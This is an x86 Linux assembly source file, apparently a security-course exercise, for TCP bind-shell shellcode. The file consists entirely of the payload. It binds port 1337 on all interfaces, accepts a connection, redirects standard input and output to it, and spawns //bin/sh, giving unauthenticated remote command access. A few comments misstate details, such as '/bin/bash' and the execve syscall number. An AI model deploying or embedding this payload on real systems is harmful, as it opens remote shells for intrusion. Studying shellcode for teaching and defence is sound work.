; Title     : TCP bind shell
; Date      : 01/10/18
; Author    : Pedro Cabral
; Blog Post : https://binaryexploit.com/TCP_Bind_Shell_Shellcode/
; Twitter   : https://twitter.com/CabrallPedro
; LinkedIn  : https://www.linkedin.com/in/pedro-cabral1992
; SLAE ID   : SLAE-1372
; Tested on : i686 GNU/Linux

global _start


_start:

; Create Socket

xor eax, eax 	; reseting the register
mov al, 0x66 	; syscall 102 (socketcall)

xor ebx, ebx 	; reseting the register

push ebx 	; 0 (protocol)
inc ebx		; ebx = 1
push ebx 	; 1  (SOCK_STREAM)
push 0x2 	; 2 (AF_INET)
mov ecx, esp 	; ecx = args array struct for the syscall
int 0x80 	; syscall

;Bind Socket

xchg edi, eax 	; save the file descriptor for future use
xor eax, eax 	; reseting the register

push eax	; 0 (0.0.0.0)
push word 0x3905; 1337
inc ebx		; ebx = 2 (AF_INET+SYS_BIND)
push bx

mov ecx, esp	; ecx = args array struct

mov al, 0x66 	; syscall 102 (socketcall)

push byte 0x10	; addrlen
push ecx	; sockaddr
push edi	; fd
mov ecx, esp	; ecx = args array struct for the syscall
int 0x80	; syscall

;Listen for Incoming connections

xor eax, eax	; reseting the register

push eax	; 0 (backlog)
push edi	; sockfd

mov al, 0x66	; syscall 102 (socketcall)
mov bl, 0x4	; ebx = 4 SYS_LISTEN
mov ecx, esp	; ecx = args array struct for the syscall
int 0x80	; syscall


;Accept connections

xor eax, eax

push eax	; NULL
push eax	; NULL
push edi	; sockfd

mov al, 0x66	; syscall 102 (socketcall)
inc ebx		; ebx = 5 SYS_ACCEPT
mov ecx, esp	; ecx = args array struct for the syscall
int 0x80	; syscall

;Redirect the stdin,stdout,stderr with dup2

xchg ebx, eax	; put the file descriptor in ebx
xor ecx, ecx	; reseting the register
mov cl, 0x2	; set the counter

loop:
mov al, 0x3f	; syscall 63 (dup2)
int 0x80	; syscall
dec ecx		; decrement counter
jns loop

; Call execve with /bin/bash

xor eax, eax	; reseting the register

push eax	; string terminator
push 0x68732f6e ; hs/n
push 0x69622f2f ; ib//

mov ebx, esp	; ebx = "//bin/sh"
push eax
push ebx
mov ecx, esp	; argv = [filename,0]

mov edx, eax	; envp = 0
mov al, 0xb	; syscall 12 (execve)
int 0x80	; syscall



